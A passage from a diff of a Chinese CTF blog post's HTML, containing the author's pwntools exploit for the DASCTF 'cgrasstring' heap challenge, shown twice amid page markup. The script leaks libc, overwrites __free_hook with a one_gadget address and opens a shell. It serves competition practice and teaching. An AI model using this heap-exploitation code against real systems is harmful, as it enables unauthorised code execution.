class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;size:&quot;,str(size))</span><br><span class="line">    sla(&quot;content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def change(index,size,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&quot;idx&quot;,str(index))</span><br><span class="line">    sla(&quot;size&quot;,str(size))</span><br><span class="line">    sa(&quot;content&quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&quot;idx&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add(0x80,b&quot;/bin/sh\x00&quot;)</span><br><span class="line">for i in range(1,8):</span><br><span class="line">    change(i,0x90,&#x27;\xe0&#x27;)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">ru(&#x27;Now you see it:&#x27;)</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebce0</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x20,b&#x27;youlin&#x27;)</span><br><span class="line">change(8,0x30,p64(free_hook))</span><br><span class="line">ogg=libcbase+0x4f432</span><br><span class="line">add(0x20,p64(ogg))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./cgrasstring"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("size:",str(size))</span><br><span class="line">    sla("content:",content)</span><br><span class="line"></span><br><span class="line">def change(index,size,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla("idx",str(index))</span><br><span class="line">    sla("size",str(size))</span><br><span class="line">    sa("content",content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla("idx",str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add(0x80,b"/bin/sh\x00")</span><br><span class="line">for i in range(1,8):</span><br><span class="line">    change(i,0x90,'\xe0')</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">ru('Now you see it:')</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x3ebce0</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line"></span><br><span class="line">add(0x20,b'youlin')</span><br><span class="line">change(8,0x30,p64(free_hook))</span><br><span class="line">ogg=libcbase+0x4f432</span><br><span class="line">add(0x20,p64(ogg))</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>
 
 
-  </div>
+                
+            </div>
+            <hr/>
 
-   <footer>
+            
 
-    <div class="meta">
-  <span class="item">
-    <span class="icon">
-      <i class="ic i-calendar-check"></i>
-    </span>
-    <span class="text">Edited on</span>
-    <time title="Modified: 2022-10-02 14:23:56" itemprop="dateModified" datetime="2022-10-02T14:23:56+08:00">2022-10-02</time>
-  </span>
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">youlin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/">http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">youlin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
 </div>
 
-      
-<div class="reward">
-  <button><i class="ic i-heartbeat"></i> Donate</button>
-  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
-  <div id="qr">
-      
-      <div>
-        <img data-src="/images/wechatpay.png" alt="youlin WeChat Pay">
-        <p>WeChat Pay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/alipay.png" alt="youlin Alipay">
-        <p>Alipay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/paypal.png" alt="youlin PayPal">
-        <p>PayPal</p>
-      </div>
-  </div>
-</div>
+                </div>
+            </div>
+            
+        </div>
+    </div>
 
-      
+    
 
-<div id="copyright">
-<ul>
-  <li class="author">
-    <strong>Post author:  </strong>youlin <i class="ic i-at"><em>@</em></i>Hexo
-  </li>
-  <li class="link">
-    <strong>Post link: </strong>
-    <a href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" title="DASCTF_X_CBCTF_2022九月挑战赛">http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022九月挑战赛/</a>
-  </li>
-  <li class="license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
-  </li>
-</ul>
-</div>
+    
 
-  </footer>
+    
 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/09/21/aarch64/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="aarch64">
+                        
+                        <span class="card-title">aarch64</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-21
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            youlin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/14/house-of-cat/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="house_of_cat">
+                        
+                        <span class="card-title">house_of_cat</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            youlin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
 </article>
 
-  </div>
-  
-
-<div class="post-nav">
-    <div class="item left">
-      
-
-  <a href="/2022/09/14/house-of-cat/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeu7txpzj20zk0m81kx.jpg" title="house_of_cat">
-  <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>house_of_cat</h3>
-  </a>
-
-    </div>
-    <div class="item right">
-      
-
-  <a href="/2022/09/21/aarch64/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyvx1d4j20zk0m8hdt.jpg" title="aarch64">
-  <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>aarch64</h3>
-  </a>
-
-    </div>
 </div>
 
-  
-  <div class="wrap" id="comments"></div>
 
 
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
         </div>
-        <div id="sidebar">
-          
-
-<div class="inner">
-
-  <div class="panels">
-    <div class="inner">
-      <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberprinter"><span class="toc-number">1.</span> <span class="toc-text">cyberprinter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#appetizer"><span class="toc-number">2.</span> <span class="toc-text">appetizer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bar"><span class="toc-number"></span> <span class="toc-text">bar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-note"><span class="toc-number"></span> <span class="toc-text">ez_note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cgrasstring"><span class="toc-number">1.</span> <span class="toc-text">cgrasstring</span></a></li></ol>
-      </div>
-      <div class="related panel pjax" data-title="Related">
-        <ul>
-          <li><a href="/2022/03/18/picoCTF-wp/" rel="bookmark" title="picoCTF_wp">picoCTF_wp</a></li><li><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" rel="bookmark" title="巅峰极客复现">巅峰极客复现</a></li><li class="active"><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></li><li><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" rel="bookmark" title="柏鹭杯">柏鹭杯</a></li>
-        </ul>
-      </div>
-      <div class="overview panel" data-title="Overview">
-        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="image" itemprop="image" alt="youlin"
-      data-src="/images/avatar.jpg">
-  <p class="name" itemprop="name">youlin</p>
-  <div class="description" itemprop="description"></div>
-</div>
-
-<nav class="state">
-    <div class="item posts">
-      <a href="/archives/">
-        <span class="count">24</span>
-        <span class="name">posts</span>
-      </a>
     </div>
-    <div class="item categories">
-      <a href="/categories/">
-        <span class="count">1</span>
-        <span class="name">categories</span>
-      </a>
-    </div>
-</nav>
-
-<div class="social">
 </div>
 
-<ul class="menu">
-  
-    
-  <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
-  </li>
+<!-- TOC 悬浮按钮. -->
 
-
-</ul>
-
-      </div>
-    </div>
-  </div>
-
-  <ul id="quick">
-    <li class="prev pjax">
-        <a href="/2022/09/14/house-of-cat/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
-    </li>
-    <li class="up"><i class="ic i-arrow-up"></i></li>
-    <li class="down"><i class="ic i-arrow-down"></i></li>
-    <li class="next pjax">
-        <a href="/2022/09/21/aarch64/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
-    </li>
-    <li class="percent"></li>
-  </ul>
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
 </div>
 
 
-        </div>
-        <div class="dimmer"></div>
-      </div>
-    </main>
-    <footer id="footer">
-      <div class="inner">
-        <div class="widgets">
-          
-<div class="rpost pjax">
-  <h2>Random Posts</h2>
-  <ul>
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
 
-    <span><a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" title="利用_IO_2_1_stdout泄露libc">利用_IO_2_1_stdout泄露libc</a></span>
-  </li>
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
 
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
 
-    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
-  </li>
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
 
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" title="格式化字符串泄露canary">格式化字符串泄露canary</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/" title="unlink复习">unlink复习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/" title="buu_web（1-20）">buu_web（1-20）</a></span>
-  </li>
-
-  </ul>
-</div>
-<div>
-  <h2>Recent Comments</h2>
-  <ul class="leancloud-recent-comment"></ul>
-</div>
-
-        </div>
-        <div class="status">
-  <div class="copyright">
-    
-    &copy; 2010 – 
-    <span itemprop="copyrightYear">2022</span>
-    <span class="with-love">
-      <i class="ic i-sakura rotate"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">youlin @ youlin</span>
-  </div>
-  <div class="powered-by">
-    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
-  </div>
-</div>
-
-      </div>
-    </footer>
-  </div>
-<script data-config type="text/javascript">
-  var LOCAL = {
-    path: '2022/09/20/DASCTF-X-CBCTF-2022九月挑战赛/',
-    favicon: {
-      show: "（●´3｀●）Goooood",
-      hide: "(´Д｀)Booooom"
-    },
-    search : {
-      placeholder: "Search for Posts",
-      empty: "We didn't find any results for the search: ${query}",
-      stats: "${hits} results found in ${time} ms"
-    },
-    valine: true,fancybox: true,
-    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
-    ignores : [
-      function(uri) {
-        return uri.includes('#');
-      },
-      function(uri) {
-        return new RegExp(LOCAL.path+"$").test(uri);
-      }
-    ]
-  };
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
 </script>
 
-<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+    
 
-<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
-
-<script src="/js/app.js?v=0.2.5"></script>
+</main>
 
 
 
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <a href="/about" target="_blank">youlin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/wscyoulin" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1498041059@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1498041059" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1498041059" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
